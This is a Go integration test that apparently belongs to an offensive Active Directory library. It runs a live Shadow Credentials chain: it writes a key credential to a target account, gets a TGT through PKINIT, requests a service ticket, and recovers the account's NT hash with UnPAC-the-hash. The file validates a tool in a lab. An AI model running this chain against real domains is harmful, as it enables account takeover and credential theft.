//go:build integration

// Live end-to-end coverage for the Shadow Credentials -> PKINIT -> TGT ->
// UnPAC-the-hash chain against a real AD domain controller (with AD CS so the
// KDC has a certificate). It is excluded from the default build by the
// "integration" tag and skips unless the environment is configured.
//
// Required environment:
//
//	SHADOWCRED_DC        DC host (LDAP + KDC), e.g. dc01.corp.local
//	SHADOWCRED_KDC       KDC host/IP (often the same as the DC)
//	SHADOWCRED_REALM     Kerberos realm, e.g. CORP.LOCAL
//	SHADOWCRED_ADMIN     privileged account able to write msDS-KeyCredentialLink
//	SHADOWCRED_ADMINPW   that account's password
//	SHADOWCRED_TARGETDN  DN of a controllable account to shadow (created/cleaned by the caller)
//	SHADOWCRED_TARGETSAM sAMAccountName of that account
//	SHADOWCRED_SPN       an SPN to prove the TGT works, e.g. cifs/dc01.corp.local
package shadowcredentials

import (
	"os"
	"testing"

	"github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
)

func TestLiveShadowCredentialsPKINITChain(t *testing.T) {
	dc := os.Getenv("SHADOWCRED_DC")
	kdc := os.Getenv("SHADOWCRED_KDC")
	realm := os.Getenv("SHADOWCRED_REALM")
	admin := os.Getenv("SHADOWCRED_ADMIN")
	adminPw := os.Getenv("SHADOWCRED_ADMINPW")
	targetDN := os.Getenv("SHADOWCRED_TARGETDN")
	targetSAM := os.Getenv("SHADOWCRED_TARGETSAM")
	spn := os.Getenv("SHADOWCRED_SPN")
	if dc == "" || kdc == "" || realm == "" || admin == "" || adminPw == "" || targetDN == "" || targetSAM == "" {
		t.Skip("set SHADOWCRED_* to run the live Shadow Credentials PKINIT chain")
	}

	creds, err := credentials.NewCredentials(realm, admin, adminPw, "")
	if err != nil {
		t.Fatalf("credentials: %v", err)
	}
	sess, err := ldap.NewSession(dc, 389, creds, false, true)
	if err != nil {
		t.Fatalf("ldap session: %v", err)
	}
	if ok, err := sess.Connect(); err != nil || !ok {
		t.Fatalf("ldap bind: %v", err)
	}
	defer sess.Close()

	cred, err := GenerateAndAdd(sess, targetDN)
	if err != nil {
		t.Fatalf("GenerateAndAdd: %v", err)
	}
	defer func() {
		if err := RemoveCredential(sess, cred); err != nil {
			t.Errorf("RemoveCredential (cleanup): %v", err)
		}
	}()

	client, err := cred.Authenticate(targetSAM, realm, kdc)
	if err != nil {
		t.Fatalf("PKINIT Authenticate: %v", err)
	}
	if !client.HasTGT() {
		t.Fatal("no TGT after PKINIT")
	}
	t.Logf("[ok] PKINIT TGT obtained for %q", targetSAM)

	if spn != "" {
		if _, _, _, _, err := client.GetTGS(spn, true); err != nil {
			t.Fatalf("GetTGS(%s): %v", spn, err)
		}
		t.Logf("[ok] service ticket for %q obtained (TGT usable)", spn)
	}

	_, ntHash, err := client.UnPACTheHash()
	if err != nil {
		t.Logf("UnPAC-the-hash unavailable: %v", err)
		return
	}
	if len(ntHash) != 16 {
		t.Fatalf("UnPAC-the-hash returned a %d-byte NT hash", len(ntHash))
	}
	t.Logf("[ok] UnPAC-the-hash recovered a %d-byte NT hash", len(ntHash))
}
